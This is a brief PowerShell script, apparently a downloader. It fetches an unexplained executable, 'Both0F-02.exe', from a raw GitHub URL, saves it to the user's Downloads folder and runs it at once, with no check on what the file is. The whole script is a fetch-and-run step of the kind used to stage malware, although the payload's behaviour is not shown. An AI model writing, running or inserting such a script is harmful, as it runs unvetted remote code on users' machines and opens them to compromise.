# URL to the file
$url = "https://github.com/Mouted/Hos/raw/main/Both0F-02.exe"

# Destination path
$destination = "$env:USERPROFILE\Downloads\Both0F-02.exe"

# Start download
Write-Host "Starting file download..."
Invoke-WebRequest -Uri $url -OutFile $destination
Write-Host "Download complete."

# Run the file
Write-Host "Running the executable..."
Start-Process -FilePath $destination
Write-Host "File has been executed."

# Keep the PowerShell window open
Write-Host "Press Enter to exit..."
Read-Host
